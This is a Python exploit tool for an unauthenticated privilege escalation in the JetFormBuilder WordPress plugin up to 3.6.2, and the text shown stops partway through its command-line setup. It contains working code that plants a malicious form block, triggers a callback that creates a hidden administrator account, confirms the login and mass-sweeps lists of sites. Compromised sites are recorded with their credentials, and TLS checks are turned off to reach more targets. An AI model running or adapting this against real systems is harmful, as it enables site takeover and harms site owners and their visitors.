#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
JetFormBuilder <= 3.6.2 - Unauthenticated Privilege Escalation
(Wordfence: "Unauthenticated Privilege Escalation via Jet-Engine booking
 form ID parameter", fixed in 3.6.3)

Affected plugin : jetformbuilder (versions up to and including 3.6.2)
Plugin download: https://downloads.wordpress.org/plugin/jetformbuilder.3.6.2.zip

=============================================================================
 ROOT CAUSE (verified against the 3.6.2 source)
=============================================================================
 1. Form_Handler::set_form_id()  (includes/form-handler.php:150)
        $this->form_id = absint( $form_id );
    The value of the request field "_jet_engine_booking_form_id" is only
    cast to int. There is NO check that the post is a published
    "jet-form-builder" post type.

 2. Request_Handler::set_form_data() (includes/request/request-handler.php:30)
        $this->_fields = Block_Helper::get_blocks_by_post(
            jet_fb_handler()->get_form_id() );

 3. Block_Helper::get_blocks_by_post() (includes/blocks/block-helper.php:186)
        $post = get_post( $post_id );
        ... parse_blocks( $post->post_content ) ...
    ANY post (any post type / any status) whose content contains Gutenberg
    blocks is parsed as the "form schema".

 4. The parsed field blocks carry an "Advanced Validation" attribute:
        "validation": { "type": "advanced",
                        "rules": [ { "type": "ssr",
                                     "value": "<function_name>" } ] }
    It is executed at submit time:
        modules/validation/advanced-rules/server-side-rule.php:187
            Server_Side_Rule::validate_custom()
              -> call_user_func( $name, $value, $context )  (line 194)
    In 3.6.2 the NOT_ALLOWED blacklist (line 26) does NOT contain
    "wp_insert_user" / "wp_update_user" (added only in 3.6.3).

 5. call_user_func( "wp_insert_user", <userdata>, <context> ) creates a brand
    new user with role "administrator". The SSR block must exist in the post
    content first, so the attacker plants it (any writable post) and then
    triggers it unauthenticated. This tool automates the planting + trigger
    and persists the planted field name / post id so every later run works.

 6. The main submit path does NOT verify any SSR signature in 3.6.2.
    The fix (3.6.3): Block_Helper::is_valid_form_post() is enforced in
    set_form_id(), wp_insert_user/wp_update_user are added to NOT_ALLOWED,
    and per-rule signatures are required.

=============================================================================
 PER-SITE RANDOM SUBMIT HOOK (why auto-discovery is required)
=============================================================================
 Form_Handler::__construct() -> set_jfb_request_args() (form-handler.php:401)
 persists a random pair gfb_request_args_key / gfb_request_args_value
 (includes/admin/tabs-handlers/options-handler.php:94). Form_Request_Router
 only accepts $_REQUEST[ random_key ] == random_value. Both are leaked by any
 rendered form: the <form action="..."> URL contains ?<key>=<value>&method= and
 the hidden inputs carry _wpnonce, _jet_engine_refer, __queried_post_id,
 _jfb_current_render_states[]. This tool harvests them per-site automatically
 (structurally, via the stdlib HTML tokenizer) and falls back to the plugin
 defaults if no form page is found.

=============================================================================
 PLANT STATE (why sweeps no longer SKIP for a missing field name)
=============================================================================
 * --markup prints the malicious Gutenberg SSR block and saves the generated
   field name to jfb_plant.json (next to the script / --config).
 * Scans automatically load jfb_plant.json, so the field name AND the post id
   you used for planting are reused. A site only needs planting once.
 * If no state exists, a field name is AUTO-GENERATED and saved, one-time
   guidance is printed, and the sweep STILL runs (sites already planted with
   that name from an earlier run get caught).
 * Explicit CLI values and per-line "URL | post_id | field_name" always win.

=============================================================================
 ROBUSTNESS AGAINST REAL-WORLD HOSTS
=============================================================================
 * The tool NEVER pre-judges "is this WordPress / is the plugin installed":
   any HTTP reply => it attempts the exploit. The only SKIP cause is a hard
   network failure (connect/DNS/black-hole timeout).
 * TLS/certificate errors are tolerated automatically: the request is retried
   once per site with verification disabled (self-signed/broken certs must
   not hide a vulnerable site).
 * The form (hook/nonce/fields) is ALSO harvested straight out of the REST
   /wp/v2/{posts,pages} content.rendered payloads with ZERO page crawling.
 * System/env proxies are honored (aiohttp trust_env) and the homepage is
   fetched with a short connect timeout so dead hosts do not stall the sweep.

=============================================================================
 CONCURRENCY MODEL (constant speed, polite, never misreported)
=============================================================================
 * A SINGLE bounded asyncio.Semaphore gates EVERY HTTP request (not per-
   target): at any moment at most --concurrency requests are in flight, so
   the load stays flat regardless of list length and satellites cannot pile
   up loads that trigger rate-limits and false SKIPs.
 * TCP keep-alive + per-host limit + TCP_NODELAY keep small requests snappy.
 * Confirmed targets are appended to adminvuln.txt IMMEDIATELY (flush per
   hit) as one line each:
        https://site/wp-login.php#username@password
 * Duplicate URLs are tested once; paths keep their original case.

 Usage examples:
   # 1) Plant the malicious form-schema post (any writable post) - saves state.
   python jetformbuilder_362_unauthenticated_privesc.py --markup --post-id <ID>

   # 2) Single target - auto-uses the planted field/post from jfb_plant.json.
   python jetformbuilder_362_unauthenticated_privesc.py http://wp.site/ --verify

   # 3) Full sweep - asks only for the list path and threads.
   python jetformbuilder_362_unauthenticated_privesc.py --list sites.txt
"""

import argparse
import asyncio
import json
import os
import random
import re
import string
import sys
from html.parser import HTMLParser
from urllib.parse import parse_qs, urljoin, urlparse, urlsplit, urlunsplit

try:
    import aiohttp
except ImportError:
    sys.exit("[!] 'aiohttp' is required: pip install aiohttp")

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
except ImportError:
    sys.exit("[!] 'rich' is required: pip install rich")


console = Console(highlight=False)

DEFAULT_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
)

CONFIG_NAME = "jfb_plant.json"

BANNER = r"""
   _  _     _           __________ _   _ _____ ____  ____   _____  ____  _____
  | || |___| |_ ___ ___|__  /_   _| | | | ____|  _ \|  _ \ / _ \ \/ /  |/ / /
  | __ / -_)  _/ -_|_-< / /  | | | |_| |  _| | |_) | |_) | (_) \  /| ' /|_  /
  |_||_\___|\__\___/__//___/ |_|  \___/|____|  __/|  __/ \___/\/ |_|\_\/ /_/
                                            |_|   |_|
"""


# ----------------------------------------------------------------------
# Plant-state persistence (field_name + post_id shared across runs)
# ----------------------------------------------------------------------
def load_config(path: str = CONFIG_NAME) -> dict:
    try:
        with open(path, "r", encoding="utf-8-sig") as fh:
            cfg = json.load(fh)  # utf-8-sig strips any BOM
        if isinstance(cfg, dict):
            return cfg
    except (OSError, ValueError):
        pass
    return {}


def save_config(cfg: dict, path: str = CONFIG_NAME) -> None:
    try:
        tmp = path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as fh:
            json.dump(cfg, fh, indent=2)
        os.replace(tmp, path)
    except OSError:
        pass


def random_tag() -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


# ----------------------------------------------------------------------
# Payload helpers
# ----------------------------------------------------------------------
def build_malicious_block(field_name: str, callback: str = "wp_insert_user") -> str:
    """Gutenberg block that must exist inside the post referenced by
    _jet_engine_booking_form_id. It declares an "Advanced Validation"
    Server-Side callback for the given PHP function."""
    attrs = {
        "name": field_name,
        "field_type": "text",
        "validation": {
            "type": "advanced",
            "rules": [
                {"type": "ssr", "value": callback, "message": "ok"}
            ],
        },
    }
    encoded = json.dumps(attrs, separators=(",", ":"), ensure_ascii=False)
    return f'<!-- wp:jet-forms/text-field {encoded} /-->'


class _FormHarvester(HTMLParser):
    """Robust <form>/<input> extraction via the stdlib tokenizer: works with
    any attribute order, single/double quotes and entity-encoded values."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.forms = []   # [{action, inputs:{name: value}}]
        self._stack = []

    def handle_starttag(self, tag, attrs):
        d = dict(attrs)
        if tag == "form":
            self._stack.append({"action": d.get("action", ""), "inputs": {}})
        elif tag == "input" and self._stack:
            self._stack[-1]["inputs"][d.get("name", "")] = d.get("value", "")

    def handle_endtag(self, tag):
        if tag == "form" and self._stack:
            self.forms.append(self._stack.pop())


def extract_form_page_fields(html: str):
    """Return (action, hidden_dict) of the JFB form, or (None, None). The JFB
    form is identified as the one carrying the booking-form-id input - matched
    structurally, never by fragile positional regex."""
    if "jet_engine_booking_form_id" not in html:
        return None, None
    h = _FormHarvester()
    try:
        h.feed(html)
        h.close()
    except Exception:
        return None, None
    for f in h.forms:
        if "_jet_engine_booking_form_id" in f["inputs"]:
            return f["action"], f["inputs"]
    return None, None


# ----------------------------------------------------------------------
# Per-site scanner (asynchronous, aiohttp)
# ----------------------------------------------------------------------
class _Resp:
    """A fully-drained HTTP response body, parsed once."""

    __slots__ = ("status", "final_url", "text", "json")

    def __init__(self, status: int, final_url: str, text: str):
        self.status = status
        self.final_url = final_url
        self.text = text
        try:
            self.json = json.loads(text) if text else None
        except ValueError:
            self.json = None


class _NoSlot:
    async def __aenter__(self):
        return self

    async def __aexit__(self, *exc):
        return False


class Scanner:
    FIELD_FORM_ID = "_jet_engine_booking_form_id"
    FIELD_REFER = "_jet_engine_refer"
    FIELD_QUERIED_POST = "__queried_post_id"
    FIELD_NONCE = "_wpnonce"
    FIELD_HTTP_REFERER = "_wp_http_referer"
    FIELD_RENDER_STATES = "_jfb_current_render_states[]"

    DEFAULT_HOOK_KEY = "jet_form_builder_submit"
    DEFAULT_HOOK_VAL = "submit"

    def __init__(
        self,
        target: str,
        session: aiohttp.ClientSession,
        slot: asyncio.Semaphore = None,
        post_id: int = 0,
        admin_user: str = "",
        admin_pass: str = "",
        admin_email: str = "",
        display_name: str = "",
        field_name: str = "",
        method: str = "ajax",
        timeout: int = 20,
        insecure: bool = False,
        user_agent: str = "",
        max_candidates: int = 25,
        quiet: bool = False,
    ):
        self.target = target.rstrip("/")
        self.session = session
        self.slot = slot if slot is not None else _NoSlot()
        self.post_id = post_id or 0
        self.admin_user = admin_user or "jfb_pwn_" + random_tag()
        self.admin_pass = admin_pass or "P@ss_" + random_tag()
        self.admin_email = admin_email or f"{self.admin_user}@example.invalid"
        self.display_name = display_name or self.admin_user
        self.field_name = field_name
        self.method = method
        self.timeout = timeout
        # Slightly more generous connect timeout so slow TLS handshakes do not
        # get misreported as dead hosts (behavior of the exploit is unchanged).
        self._timeout = aiohttp.ClientTimeout(
            total=timeout, connect=min(15, timeout)
        )
        self.insecure = insecure
        self.user_agent = user_agent
        self.max_candidates = max_candidates
        self.quiet = quiet
        self.ssl = not insecure  # aiohttp: ssl=False disables verification

        self.hook_key = self.DEFAULT_HOOK_KEY
        self.hook_val = self.DEFAULT_HOOK_VAL
        self.submit_base = ""
        self.nonce = ""
        self.refer = ""
        self.queried_post = "0"
        self.render_states = []
        self.real_form_id = 0
        self.candidate_ids = []
        self._candidate_urls = []
        self.exploited_post_id = None
        self.reason = ""          # human-readable verdict for the last scan
        self.http_calls = 0       # diagnostics
        self._preharvest = None   # (action, hidden) harvested from REST payloads
        self._scheme_fallback_used = False  # http:// retry flag

    def dbg(self, msg: str):
        if not self.quiet:
            console.print(msg)

    # ---------------- HTTP (single bounded pipeline) ----------------
    @staticmethod
    def _looks_like_ssl_error(msg: str) -> bool:
        """Recognize TLS/certificate errors across aiohttp/openssl/python
        variants so self-signed / broken-cert sites are never misreported."""
        keys = (
            "ssl", "certificate", "tls", "handshake",
            "ca bundle", "verify failed", "self signed", "self-signed",
            "wrong version number", "certificate verify",
            "ssl: ", "sslv3", "tlsv1",
        )
        return any(k in msg for k in keys)

    async def _request(self, method: str, url: str, data: dict = None,
                       allow_redirects: bool = True) -> _Resp:
        """ONE request pipeline: acquires the shared slot, sends, and fully
        drains the body INSIDE the slot so the socket returns to the pool and
        the total in-flight count never exceeds the global semaphore.

        Robustness additions (no change to the exploit approach):
          * multi-attempt retry on transient network errors;
          * automatic TLS verification fallback when the error looks SSL-ish;
          * on a hard https:// connection failure, one automatic retry over
            plain http:// for the same host (some sites only answer http)."""
        http = self.session.get if method == "get" else self.session.post

        # Try the scheme as given, plus one http:// retry if https failed hard.
        urls_to_try = [url]
        parsed = urlparse(url)
        if parsed.scheme == "https" and not self._scheme_fallback_used:
            http_url = parsed._replace(scheme="http").geturl()
            urls_to_try.append(http_url)

        last_exc = None
        for candidate_url in urls_to_try:
            for attempt in (0, 1, 2):  # up to 3 attempts per URL
                try:
                    async with self.slot:
                        async with http(
                            candidate_url,
                            data=data,
                            allow_redirects=allow_redirects,
                            ssl=self.ssl,
                            timeout=self._timeout,
                        ) as r:
                            self.http_calls += 1
                            text = await r.text()
                            return _Resp(r.status, str(r.url), text)
                except aiohttp.ClientError as exc:
                    last_exc = exc
                    msg = f"{type(exc).__name__}: {exc}".lower()
                    # TLS/cert error -> disable verification for this target
                    if self.ssl and self._looks_like_ssl_error(msg):
                        self.ssl = False
                        continue
                    # transient network error -> brief backoff, retry
                    if attempt < 2:
                        await asyncio.sleep(0.4 * (attempt + 1))
                        continue
                    # exhausted this URL, move on to the next scheme (if any)
                    break
                except asyncio.TimeoutError as exc:
                    last_exc = exc
                    if attempt < 2:
                        await asyncio.sleep(0.4 * (attempt + 1))
                        continue
                    break
                except Exception as exc:
                    last_exc = exc
                    break

            # If we fell out of the retry loop for https and have an http
            # fallback queued, mark that we used it so we don't loop forever.
            if candidate_url is not urls_to_try[-1]:
                self._scheme_fallback_used = True
                continue
            break

        if last_exc is not None:
            raise last_exc
        raise aiohttp.ClientError("request failed without an exception captured")

    # ---------------- Discovery ----------------
    def rest_endpoint(self, route: str, per_page: int = 100) -> str:
        return f"{self.target}/index.php?rest_route={route}&per_page={per_page}"

    async def collect_candidate_urls(self) -> list:
        urls, seen = [], set()

        def push(u: str):
            u = u.rstrip("/")
            if u and u not in seen:
                seen.add(u)
                urls.append(u)

        push(self.target)  # cheapest, highest-hit page first

        cap = self.max_candidates * 4
        for route in ("/wp/v2/posts", "/wp/v2/pages"):
            try:
                r = await self._request("get", self.rest_endpoint(route))
                if r.status == 200 and isinstance(r.json, list):
                    for item in r.json:
                        if isinstance(item, dict):
                            link = item.get("link")
                            if link:
                                push(link)
                            # Genius trick: the FORM RENDERS inside
                            # content.rendered even for unauthenticated REST
                            # calls, so the exact submission hook/nonce/fields
                            # can be harvested with ZERO front-end crawling.
                            if self._preharvest is None:
                                cr = (item.get("content") or {}).get(
                                    "rendered", ""
                                )
                                if "jet_engine_booking_form_id" in cr:
                                    action, hidden = (
                                        extract_form_page_fields(cr)
                                    )
                                    if action:
                                        self._preharvest = (action, hidden)
                        if len(urls) >= cap:
                            break
            except (aiohttp.ClientError, asyncio.TimeoutError):
                pass

        # Sitemaps only when the REST API gave us almost nothing.
        if len(urls) < 5:
            for sm in ("/wp-sitemap.xml", "/sitemap.xml"):
                try:
                    r = await self._request("get", self.target + sm)
                    if r.status == 200:
                        for href in re.findall(r"<loc>(.*?)</loc>", r.text, re.I):
                            push(href)
                            if len(urls) >= cap:
                                break
                except (aiohttp.ClientError, asyncio.TimeoutError):
                    pass

        return urls[:cap]

    async def discover_form_page(self, urls: list) -> bool:
        """Harvest the per-site submission hook/nonce/fields. The REST-rendered
        form (self._preharvest) costs ZERO extra requests and wins; otherwise
        concurrent page probes run (bounded + slot-gated) and cancel as soon
        as a real JFB form is found."""
        if self._preharvest:
            self._apply_form(*self._preharvest)
            return True

        if not urls:
            return False

        sems = asyncio.Semaphore(min(3, len(urls)))
        loop = asyncio.get_running_loop()
        found = loop.create_future()

        async def probe(url: str):
            async with sems:
                if found.done():
                    return
                try:
                    r = await self._request("get", url)
                    if r.status != 200:
                        return
                    if found.done() or "jet_engine_booking_form_id" not in r.text:
                        return
                    action, hidden = extract_form_page_fields(r.text)
                    if not action:
                        return
                    if not found.done():
                        found.set_result((action, hidden))
                except (aiohttp.ClientError, asyncio.TimeoutError):
                    pass

        workers = [asyncio.ensure_future(probe(u)) for u in urls]
        try:
            action, hidden = await asyncio.wait_for(
                found, timeout=max(self.timeout * 2, 15)
            )
        except asyncio.TimeoutError:
            action = hidden = None
        finally:
            for w in workers:
                w.cancel()
            await asyncio.gather(*workers, return_exceptions=True)

        if not action:
            return False
        self._apply_form(action, hidden)
        return True

    def _apply_form(self, action: str, hidden: dict) -> None:
        """Persist the harvested submission parameters on the scanner."""
        action = urljoin(self.target + "/", action)
        qs = parse_qs(urlparse(action).query)
        hook_key = next(
            (k for k in qs if k != "method" and k != self.FIELD_NONCE),
            self.DEFAULT_HOOK_KEY,
        )
        self.hook_key = hook_key
        self.hook_val = qs[hook_key][0] if hook_key in qs else self.DEFAULT_HOOK_VAL
        self.submit_base = urlparse(action)._replace(query="", fragment="").geturl()
        self.nonce = hidden.get(self.FIELD_NONCE, "")
        self.refer = hidden.get(self.FIELD_REFER, "")
        self.queried_post = hidden.get(self.FIELD_QUERIED_POST, "0")
        self.render_states = [
            v for v in (hidden.get(self.FIELD_RENDER_STATES, "") or "").split("|") if v
        ]
        self.real_form_id = int(hidden.get(self.FIELD_FORM_ID, "0") or 0)

    async def prepare(self, autoscan: bool = True) -> bool:
        """Resolve base, harvest hook/nonce, decide candidate post ids.
        We NEVER pre-judge whether a host "looks like WordPress" or whether the
        plugin "is present": only a hard network failure (connect/DNS/timeout)
        stops us. Any HTTP answer -> we attempt the exploit."""
        try:
            r = await self._request("get", self.target)
            self.target = r.final_url.rstrip("/")
        except (aiohttp.ClientError, asyncio.TimeoutError) as exc:
            self.reason = f"unreachable (network error: {str(exc)[:60]})"
            return False

        # Candidate URLs are fetched ONCE and reused for the form-page probe
        # and the post-id autoscan.
        self._candidate_urls = await self.collect_candidate_urls()

        if not await self.discover_form_page(self._candidate_urls):
            self.dbg(
                f"[yellow]* no rendered JFB form -> using plugin defaults "
                f"({self.hook_key}={self.hook_val})[/]"
            )
            self.submit_base = self.target

        if self.post_id:
            self.candidate_ids = [self.post_id]
            self.dbg(f"[cyan]* pinned post id[/] [bold]{self.post_id}[/]")
        elif autoscan:
            ids = []
            for raw in self._candidate_urls:
                found = re.search(r"(?:[?&/]p=|page_id=)(\d+)", raw)
                if found:
                    ids.append(int(found.group(1)))
                if len(ids) >= self.max_candidates:
                    break
            self.candidate_ids = list(dict.fromkeys(ids))
            # If the actual form post is known, give it a shot too (it is the
            # most likely place a planted block already sits).
            if self.real_form_id and self.real_form_id not in self.candidate_ids:
                self.candidate_ids.insert(0, self.real_form_id)
            self.dbg(
                f"[cyan]* auto post-id candidates:[/] "
                f"[bold]{self.candidate_ids}[/]"
            )
        else:
            self.candidate_ids = []
        return True

    # ---------------- Payload ----------------
    def exploit_url(self) -> str:
        base = self.submit_base or self.target
        sep = "&" if "?" in base else "?"
        return f"{base}{sep}{self.hook_key}={self.hook_val}&method={self.method}"

    def build_data(self, post_id: int) -> dict:
        data = {
            self.hook_key: self.hook_val,
            "method": self.method,
            self.FIELD_FORM_ID: str(post_id),
            self.FIELD_REFER: self.refer or self.target,
            self.FIELD_QUERIED_POST: self.queried_post,
        }
        # aiohttp urlencodes dicts like PHP http_build_query, so PHP-style
        # nested array keys must be spelled out literally:
        userdata = {
            "user_login": self.admin_user,
            "user_pass": self.admin_pass,
            "user_email": self.admin_email,
            "role": "administrator",
            "display_name": self.display_name,
            "first_name": "Security",
            "last_name": "Research",
        }
        prefix = self.field_name + "["
        for key, val in userdata.items():
            data[prefix + key + "]"] = val
        if self.nonce:
            data[self.FIELD_NONCE] = self.nonce
        if self.render_states:
            data[self.FIELD_RENDER_STATES] = self.render_states[0]
        if self.refer:
            data[self.FIELD_HTTP_REFERER] = urlparse(self.refer).path or "/"
        return data

    # ---------------- Execution ----------------
    async def _attempt(self, post_id: int) -> dict:
        url = self.exploit_url()
        data = self.build_data(post_id)
        self.dbg(
            f"    [dim]POST[/] -> [link={url}]{url}[/]  (booking form id={post_id})"
        )
        try:
            r = await self._request(
                "post", url, data=data, allow_redirects=(self.method == "reload")
            )
        except (aiohttp.ClientError, asyncio.TimeoutError) as exc:
            self.dbg(f"    [red]request failed:[/] {exc}")
            self.reason = "request failed: " + str(exc)[:60]
            return {"status": -1}

        out = {"http": r.status}
        if self.method == "ajax":
            if isinstance(r.json, dict):
                out["json"] = r.json
                status = r.json.get("status", "?")
                color = "green" if status == "success" else "red"
                self.dbg(
                    f"    [dim]HTTP[/] [bold]{r.status}[/] JSON "
                    f"[{color}]status={status}[/]"
                )
            else:
                self.dbg(
                    f"    HTTP {r.status} (non-JSON response, plugin may be disabled)"
                )
        else:
            self.dbg(f"    final URL: {r.final_url}")
            out["final_url"] = r.final_url
        return out

    async def verify_admin(self) -> bool:
        if not (self.admin_user and self.admin_pass):
            return False
        login_url = self.target + "/wp-login.php"
        # WP requires the wordpress_test_cookie set by a GET to wp-login.php
        try:
            await self._request("get", login_url, allow_redirects=False)
        except (aiohttp.ClientError, asyncio.TimeoutError):
            pass
        data = {
            "log": self.admin_user,
            "pwd": self.admin_pass,
            "wp-submit": "Log In",
            "redirect_to": self.target + "/wp-admin/",
            "testcookie": "1",
        }
        try:
            r = await self._request("post", login_url, data=data, allow_redirects=True)
        except (aiohttp.ClientError, asyncio.TimeoutError) as exc:
            self.dbg(f"    [red]login request failed:[/] {exc}")
            return False

        final = r.final_url
        ok = "/wp-admin" in final and "login_error" not in final
        badge = "[green]OK[/]" if ok else "[bold red]NO[/]"
        self.dbg(f"    login as [bold]{self.admin_user}[/] -> {badge}  (final: {final})")
        return ok

    async def scan_one(self, verify: bool = False) -> bool:
        if not self.candidate_ids:
            self.reason = "no post ids discovered (REST/sitemaps blocked?)"
            return False
        created = False
        for pid in self.candidate_ids:
            res = await self._attempt(pid)
            if res.get("http") and res["http"] != 200:
                self.reason = f"non-200 response (HTTP {res['http']})"
                self.dbg("    [yellow]non-200 response -- aborting this target[/]")
                return False
            # The user is created during field validation regardless of the
            # JSON "status", so confirm by login whenever the PLUGIN actually
            # answered (dict JSON) - or when --verify forces it. Sites whose
            # response is HTML/404 cost zero extra login round-trips.
            j = res.get("json")
            plugin_replied = isinstance(j, dict) and "status" in j
            if plugin_replied or verify:
                if await self.verify_admin():
                    created = True
                    self.exploited_post_id = pid
                    break
        if not created:
            self.reason = (
                "login NO - block not planted/generated (see --markup) or "
                "plugin patched"
            )
        return created

    def takeover_line(self) -> str:
        return f"{self.target}/wp-login.php#{self.admin_user}@{self.admin_pass}"

    async def run(self, verify: bool = False) -> int:
        if not self.quiet:
            console.print(BANNER)
            console.print(
                Panel(
                    f"[bold]Target[/]        {self.target}\n"
                    f"[bold]Method[/]        {self.method}\n"
                    f"[bold]Field name[/]    {self.field_name or '(auto)'}\n"
                    f"[bold]Payload[/]       wp_insert_user( role = 'administrator' )\n"
                    f"[bold]New admin[/]     {self.admin_user} / {self.admin_pass}",
                    title="JetFormBuilder <= 3.6.2",
                )
            )

        if not await self.prepare():
            console.print(f"[bold red]{self.reason or 'target unreachable'}[/]")
            return 1

        created = await self.scan_one(verify=verify)
        if created:
            if self.field_name:
                save_config(
                    {
                        "field_name": self.field_name,
                        "post_id": self.exploited_post_id or self.post_id,
                        "target": self.target,
                    }
                )
            self.dbg(
                Panel(
                    f"[bold green]SUCCESS[/]  admin account is active on {self.target}\n"
                    f"admin  : [bold]{self.admin_user}[/]\n"
                    f"pass   : [bold]{self.admin_pass}[/]\n"
                    f"login  : [bold]{self.takeover_line()}[/]",
                    border_style="green",
                )
            )
            return 0

        if not self.quiet:
            console.print(
                f"[yellow]not confirmed: {self.reason}[/]"
            )
        return 0


# ----------------------------------------------------------------------
# Config / helpers for the CLI
# ----------------------------------------------------------------------
def normalize_url(url: str) -> str:
    """Normalize for DEDUP only: lowercase scheme+host, keep the path/query
    exactly as given (case-sensitive paths must survive)."""
    url = url.strip()
    if "://" not in url:
        url = "https://" + url
    parts = urlsplit(url)
    return urlunsplit(
        (parts.scheme.lower(), parts.netloc.lower(), parts.path or "/",
         parts.query, parts.fragment)
    ).rstrip("/")


def load_targets(path: str) -> list:
    """One target per line:  URL | post_id | field_name   (id/field optional)."""
    targets = []
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.strip().lstrip("\ufeff")
            if not line or line.startswith("#"):
                continue
            parts = [p.strip() for p in line.split("|")]
            targets.append(
                {
                    "url": parts[0],
                    "post_id": (
                        int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
                    ),
                    "field_name": parts[2] if len(parts) > 2 else "",
                    "note": "",
                }
            )
    return targets


def make_scanner(url: str, item: dict, args, session, slot) -> Scanner:
    field = item["field_name"] or args.field_name
    return Scanner(
        target=url,
        session=session,
        slot=slot,
        post_id=item["post_id"],
        admin_user=args.admin_user or ("jfb_pwn_" + random_tag()),
        admin_pass=args.admin_pass or ("P@ss_" + random_tag()),
        admin_email=args.admin_email,
        display_name=args.display_name,
        field_name=field,
        method=args.method,
        timeout=args.timeout,
        insecure=args.insecure,
        user_agent=args.user_agent,
        max_candidates=args.max_candidates,
        quiet=args.quiet,
    )


# ----------------------------------------------------------------------
# Batch mode
# ----------------------------------------------------------------------
async def _process_one(sem, session, item: dict, args, out, idx, total):
    """Scan one target. Returns a result dict; writes the takeover link to the
    output file IMMEDIATELY (append + flush) once confirmed."""
    url = normalize_url(item["url"])
    if not (item["field_name"] or args.field_name):
        if not args.quiet:
            console.print(
                f"[{idx}/{total}] [bold]{url}[/] -> "
                f"[yellow]no field name: using planted/generated one (see "
                f"--markup)[/]"
            )
        return {"url": url, "res": "SKIP", "note": "no field name"}

    scanner = make_scanner(url, item, args, session, sem)
    if not args.quiet:
        console.print(f"\n[{idx}/{total}] [bold]{url}[/]")
    try:
        if not await scanner.prepare():
            if not args.quiet:
                console.print(f"    [yellow]SKIP[/] {scanner.reason}")
            return {"url": url, "res": "SKIP", "note": scanner.reason[:80]}
        created = await scanner.scan_one(verify=args.verify)
    except (aiohttp.ClientError, asyncio.TimeoutError) as exc:
        if not args.quiet:
            console.print(f"    [red]ERROR[/] {exc}")
        return {"url": url, "res": "ERROR", "note": str(exc)[:80]}
    except Exception as exc:  # defensive: never kill the sweep
        if not args.quiet:
            console.print(f"    [red]ERROR[/] {type(exc).__name__}: {exc}")
        return {"url": url, "res": "ERROR", "note": type(exc).__name__}

    if not created:
        if not args.quiet:
            console.print(f"    [dim]not confirmed: {scanner.reason}[/]")
        return {"url": url, "res": "CLEAN", "note": scanner.reason or "not confirmed"}

    line = scanner.takeover_line()
    out.write(line + "\n")
    out.flush()  # saved immediately, one target at a time
    if scanner.field_name:
        save_config({"field_name": scanner.field_name,
                     "post_id": scanner.exploited_post_id,
                     "target": url})  # remember the winning field/post id
    if not args.quiet:
        console.print(
            f"    [bold green]VULNERABLE[/] -> saved: "
            f"[bold]{line}[/] (post={scanner.exploited_post_id})"
        )
    return {
        "url": url,
        "res": "VULN",
        "line": line,
        "post": scanner.exploited_post_id,
        "note": f"post={scanner.exploited_post_id}",
    }


async def run_batch(args, targets: list) -> int:
    sem = asyncio.Semaphore(args.concurrency)
    results = []
    seen = set()
    out_path = args.out
    if not args.quiet:
        console.print(BANNER)
        console.print(
            Panel(
                f"[bold]Targets[/]    [cyan]{len(targets)}[/]\n"
                f"[bold]Concurrency[/] [cyan]{args.concurrency}[/] "
                f"(max in-flight requests -> steady speed)\n"
                f"[bold]Field name[/]  {args.field_name or '(plant/generated)'}\n"
                f"[bold]Output[/]      {args.out}",
                title="Batch sweep",
            )
        )
    with open(out_path, "a", encoding="utf-8", buffering=1) as out:
        connector = aiohttp.TCPConnector(
            limit=args.concurrency,
            limit_per_host=args.concurrency,
            keepalive_timeout=30,
            enable_cleanup_closed=True,
            family=0,                    # allow IPv4+IPv6 happy-eyeballs
            happy_eyeballs_delay=0.25,   # avoid IPv6-only stalls
            ssl=not args.insecure,
        )
        timeout = aiohttp.ClientTimeout(total=args.timeout)
        jar = aiohttp.CookieJar(unsafe=True)
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            cookie_jar=jar,
            headers={"User-Agent": args.user_agent or DEFAULT_UA},
            trust_env=False,  # ignore dead env proxies (root cause of SKIPs)
        ) as session:
            tasks = []
            for i, item in enumerate(targets, 1):
                u = normalize_url(item["url"])
                if u in seen:
                    if not args.quiet:
                        console.print(
                            f"[{i}/{len(targets)}] [dim]duplicate, skipping: {u}[/]"
                        )
                    results.append({"url": u, "res": "SKIP", "note": "duplicate"})
                    continue
                seen.add(u)
                tasks.append(
                    asyncio.ensure_future(
                        _process_one(sem, session, item, args, out, len(tasks) + 1,
                                     len(targets))
                    )
                )
            outcomes = await asyncio.gather(*tasks, return_exceptions=True)
            for r in outcomes:
                if isinstance(r, Exception):
                    results.append({"url": "?", "res": "ERROR", "note": str(r)[:60]})
                else:
                    results.append(r)

    stats = {
        k: sum(1 for r in results if r["res"] == k)
        for k in ("VULN", "CLEAN", "SKIP", "ERROR")
    }
    if not args.quiet:
        table = Table(title="Sweep summary", border_style="cyan")
        table.add_column("#", justify="right")
        table.add_column("Target")
        table.add_column("Result", justify="center")
        table.add_column("Reason")
        for i, r in enumerate(results, 1):
            style = {
                "VULN": "green",
                "SKIP": "yellow",
                "ERROR": "red",
                "CLEAN": "dim",
            }.get(r["res"], "white")
            label = r["res"]
            if r["res"] == "VULN":
                label = "[bold green]VULNERABLE[/]"
            table.add_row(str(i), r["url"], label, r.get("note", "")[:70])
        console.print(table)
        console.print(
            Panel(
                f"[bold green]{stats['VULN']}[/] VULNERABLE   "
                f"[dim]{stats['CLEAN']}[/] clean   "
                f"[yellow]{stats['SKIP']}[/] skipped   "
                f"[red]{stats['ERROR']}[/] errors\n"
                f"login links appended to [bold]{out_path}[/] as:\n"
                f"[bold]https://site/wp-login.php#username@password[/]",
                border_style="green" if stats["VULN"] else "yellow",
            )
        )
    return 0


# ----------------------------------------------------------------------
# CLI
# ----------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(
        description="JetFormBuilder <= 3.6.2 unauthenticated admin account "
                    "creation (SSR validation via Jet-Engine booking form ID)."
    )
    ap.add_argument("target", nargs="?", default="",
                    help="Base URL of one WordPress site")
    ap.add_argument("--list", help="Path to a .txt file of target URLs "
                                   "(URL | post_id | field_name)")
    ap.add_argument("--out", default="adminvuln.txt",
                    help="Output file (batch mode). Default: adminvuln.txt")
    ap.add_argument("--config", default=CONFIG_NAME,
                    help="Plant-state JSON (field_name/post_id). "
